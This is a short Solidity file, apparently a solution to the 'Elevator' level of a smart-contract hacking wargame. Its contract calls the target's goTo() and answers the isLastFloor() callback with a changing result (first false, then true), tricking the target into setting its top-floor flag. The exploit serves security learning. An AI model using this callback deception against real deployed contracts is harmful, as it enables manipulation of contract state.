// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Attack contract for Elevator level (11)
 * @author DappScout
 * @notice 
 */


contract Attack11 {
    // Replace with your target contract address
    address payable constant CONTRACT = payable(0x6Ad322922f78939DE09E3e18A210E1b319816f1b);
    bool booly = false;

    function attack(uint256 _floor) public{
        (bool success,) = CONTRACT.call(abi.encodeWithSignature("goTo(uint256)", _floor));
        require(success == true, "Tx reverted!");
    }



    function isLastFloor(uint256) external returns (bool){

        if(booly == false){
            booly = true;
            return false;    
        }
        else{
            return true;
        }
    }
}
